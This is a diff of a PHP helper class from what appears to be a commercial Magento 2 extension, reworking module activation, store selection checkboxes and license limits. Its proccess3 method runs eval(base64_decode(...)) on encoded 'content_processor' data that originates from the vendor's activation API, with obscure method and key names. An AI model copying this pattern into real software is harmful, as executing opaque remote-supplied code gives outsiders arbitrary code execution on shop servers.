@@ -4,7 +4,7 @@ namespace GoMage\Core\Helper;
 
 class Data extends \Magento\Framework\App\Helper\AbstractHelper
 {
-    const BASE_URL = 'http://serveractivatem2.loc/api/rest';
+    const BASE_URL = 'http://mage19381.loc/api/rest';
     /** * @var \Magento\Catalog\Model\ResourceModel\Product\Attribute\CollectionFactory */
     protected $_attributeCollectionFactory;
     /** * @var \Magento\Store\Model\StoreManagerInterface */
@@ -68,11 +68,14 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
     {
         $w = [];
         $param = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups']);
+        if(!$param) {
+            $param = [];
+        }
         foreach ($param as $key => $item) {
-            if (!isset($item['a'])) {
+            if (!isset($item['i'])) {
                 continue;
             }
-            $w[$item['a']] = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups'].'/'.$item['a']);
+            $w[$item['i']] = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups'].'/'.$item['i']);
         }
         return $w;
     }
@@ -82,11 +85,14 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
     {
         $s = [];
         $param = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups']);
+        if(!$param) {
+            $param = [];
+        }
         foreach ($param as $key => $item) {
-            if (!isset($item['a'])) {
+            if (!isset($item['i'])) {
                 continue;
             }
-            $s[$item['a']] = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['group_s'].'/'.$item['a']);
+            $s[$item['i']] = $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['group_s'].'/'.'a'.$item['i']);
         }
         return $s;
     }
@@ -108,59 +114,107 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
 
         $websites = $this->getAvailableWebsites();
         $stores = $this->getAvailableStores();
+        $secure = $this->_scopeConfig->getValue('web/secure/use_in_frontend');
+        if(!$param) {
+            $param = [];
+        }
         /** @var \Magento\Store\Model\Website $website */
         foreach ($param as $key => $item) {
-            if(!isset($item['a']) || !isset($item['code'])) {
+            if(!isset($item['i']) || !isset($item['code'])) {
                 continue;
             }
-            $name = 'groups['.$this->b['groups'].']['.$this->b['fields'].']['.$item['a'].']['.$this->b['value'].']';
-            $namePrefix = 'groups['.$this->b['group_s'].']['.$this->b['fields'].']['.$item['a'].']['.$this->b['value'].']';
+            $name = 'groups['.$this->b['groups'].']['.$this->b['fields'].']['.'a'.$item['i'].']['.$this->b['value'].']';
+            $namePrefix = 'groups['.$this->b['group_s'].']['.$this->b['fields'].']['.'a'.$item['i'].']['.$this->b['value'].']';
             $html.='<div style="width: 100%; text-align: left; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'.$item['name'].'</div>';
+            if($this->_scopeConfig->getValue('section/'.'a'.$item['i'].'/n')) {
+                $html.='<div style="width: 100%; color: green; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'.__('Module is Activated').'</div>';
+            } else {
+                $html.='<div style="width: 100%; color: red; text-align: left;  font-size: 1.2em; margin-bottom: 20px; margin-top: 70px;  ">'.__('Module is not Activated').'</div>';
+            }
+            $websiteHtml  = '';
+            if($this->_scopeConfig->getValue('web/secure/use_in_frontend')) {
+                $base =  $this->_scopeConfig->getValue('web/secure/base_url');
+            } else {
+                $base =  $this->_scopeConfig->getValue('web/unsecure/base_url');
+            }
             foreach ($this->_storeManager->getWebsites() as $website) {
+                $website->getConfig('web/unsecure/base_url');
                 $element->setName($name . '[]');
                 $element->setId($id . '_' . $website->getId());
-                $element->setChecked(in_array($website->getId(), $websites[$item['a']] ? explode(',', $websites[$item['a']]) : []));
+                $element->setChecked(in_array($website->getId(), $websites[$item['i']] ? explode(',', $websites[$item['i']]) : []));
                 $element->setValue($website->getId());
-                $html .= '<div class="field website-checkbox-'.$item['code'].' choice admin__field admin__field-option">' . $element->getElementHtml() .
-                    ' <label for="' .
-                    $id . '_' . $website->getId() .
-                    '" class="admin__field-label"><span>' .
-                    $website->getName() .
-                    '</span></label>';
+                $elementHtml = $element->getElementHtml();
+                if($secure) {
+                    $conditionW = $base != $website->getConfig('web/secure/base_url');
+                } else {
+                    $conditionW = $base != $website->getConfig('web/unsecure/base_url');
+                };
+                $elementHtml = $conditionW ? $elementHtml : '';
+                $storeHtml = '';
                 foreach ($website->getStores() as $store) {
                     if(!$store->isActive())
                     {
                         continue;
                     }
-                    $element->setName($namePrefix . '[]');
-                    $element->setId($id . '_store_' . $store->getId());
-                    $element->setChecked(in_array($store->getId(), isset($stores[$item['a']]) ? explode(',', $stores[$item['a']]) : []));
-                    $element->setValue($store->getId());
-                    $html .= '<div class="field choice admin__field admin__field-option" style="margin-left: 10%">' . $element->getElementHtml() .
-                        ' <label for="' .
-                        $id . '_' . $store->getId() .
-                        '" class="admin__field-label"><span>' .
-                        $this->_storeManager->getStore($store->getId())->getName() .
-                        '</span></label>';
-                    $html .= '</div>' . "\n";
-                }
-                $html .= '</div>' . "\n";
-            }
-        }
+                    if($secure) {
+                        $condition = $base != $store->getConfig('web/secure/base_url');
+                    } else {
+                        $condition = $base!= $store->getConfig('web/unsecure/base_url');
+                    };
+                    if($condition) {
 
-        $nameStore = $element->getName();
-        $element->setName($name . '[]');
-        $jsString='';
+                        $element->setName($namePrefix . '[]');
+                        $element->setId($id . '_store_' . $store->getId());
+                        $element->setChecked(in_array($store->getId(), isset($stores[$item['i']]) ? explode(',', $stores[$item['i']]) : []));
+                        $element->setValue($store->getId());
+                        $storeHtml .= '<div class="field choice admin__field admin__field-option" style="margin-left: 10%">' . $element->getElementHtml() .
+                            ' <label for="' .
+                            $id . '_' . $store->getId() .
+                            '" class="admin__field-label"><span>' .
+                            $this->_storeManager->getStore($store->getId())->getName() .
+                            '</span></label>';
+                        $storeHtml .= '</div>' . "\n";
+                    }
+                }
+
+                if($conditionW || strlen($storeHtml) > 0) {
+                    $websiteHtml .= '<div class="field website-checkbox-'.$item['code'].' choice admin__field admin__field-option">' . $elementHtml .
+                        ' <label for="' .
+                        $id . '_' . $website->getId() .
+                        '" class="admin__field-label"><span>' .
+                        $website->getName() .
+                        '</span></label>';
+                }
+                if(strlen($storeHtml) > 0) {
+                    $websiteHtml .= $storeHtml;
+                }
+
+
+                if($conditionW || strlen($storeHtml) > 0) {
+                    $websiteHtml  .= '</div>' . "\n";
+                }
+            }
+            $html .= $websiteHtml;
+        }
+        if(!$param) {
+            $param = [];
+        } else {
+            $nameStore = $element->getName();
+            $element->setName($name . '[]');
+            $jsString='';
+        }
         foreach ($param as $key => $item) {
-            if(!isset($item['a']) || !isset($item['code'])) {
+            if(!isset($item['i']) || !isset($item['code'])) {
                 continue;
             }
-            $name = 'groups['.$this->b['groups'].']['.$this->b['fields'].']['.$item['a'].']['.$this->b['value'].'][]';
-            $namePrefix = 'groups['.$this->b['group_s'].']['.$this->b['fields'].']['.$item['a'].']['.$this->b['value'].'][]';
+            $c = (int)$this->_scopeConfig->getValue('section/'.'a'.$item['i'] . '/c') ? ((int)$this->_scopeConfig->getValue('section/'.'a'.$item['i'] . '/c') )   : 0;
+            $name = 'groups['.$this->b['groups'].']['.$this->b['fields'].']['.'a'.$item['i'].']['.$this->b['value'].'][]';
+            $namePrefix = 'groups['.$this->b['group_s'].']['.$this->b['fields'].']['.'a'.$item['i'].']['.$this->b['value'].'][]';
             $jsString .= '
             $$(".website-checkbox-'.$item['code'].' input[name=\'' . $namePrefix . '\'], .website-checkbox-'.$item['code'].' input[name=\'' . $name . '\']").each(function(element) {
                element.observe("click", function () {
-                    if($$(".website-checkbox-'.$item['code'].' input[name=\'' . $namePrefix . '\']:checked , .website-checkbox-'.$item['code'].' input[name=\'' . $name . '\']:checked").length >= ' . 2 . '){
+                    if($$(".website-checkbox-'.$item['code'].' input[name=\'' . $namePrefix . '\']:checked , .website-checkbox-'.$item['code'].' input[name=\'' . $name . '\']:checked").length >= ' .$c
+                . '){
                         $$(".website-checkbox-'.$item['code'].' input[name=\'' . $namePrefix . '\'], .website-checkbox-'.$item['code'].' input[name=\'' . $name . '\']").each(function(e){
                             if(!e.checked){
                                 e.disabled = "disabled";
@@ -175,6 +229,9 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
     			    }
                });
             });';
+        }
+        if(!$param) {
+            return '';
         }
         return $html . $this->_jsHelper->getScript(
                 'require([\'prototype\'], function(){document.observe("dom:loaded", function() {' . $jsString . '});});'
@@ -196,15 +253,29 @@ class Data extends \Magento\Framework\App\Helper\AbstractHelper
         $curl->get(self::BASE_URL.'/activates/proccessor?processorName='.$processName);
         return json_decode($curl->getBody(), true);
     }
-    public function proccess3($curl, $c='ProcessorAct') {
+    public function proccess3($curl, $data, $c='ProcessorAct') {
         try {
-            $content = $this->process2($curl, $c);
-            eval(base64_decode($content['content']));
+            eval(base64_decode($data['data_customer']['content_processor']));
             $c = 'ProcessorAct';
             $processor = new $c();
            return $processor;
         } catch (\Exception $e) {
             return false;
         }
+    }
+    /**
+     * @return string
+     */
+    private function _getVersion()
+    {
+        $objectManager = \Magento\Framework\App\ObjectManager::getInstance();
+        $moduleList = $objectManager
+            ->get('Magento\Framework\Module\ModuleListInterface');
+        return $moduleList->getOne('GoMage_Feed')['setup_version'];
+    }
+
+    public function getU()
+    {
+       return $this->_scopeConfig->getValue($this->b['section'].'/'.$this->b['groups']);
     }
 }
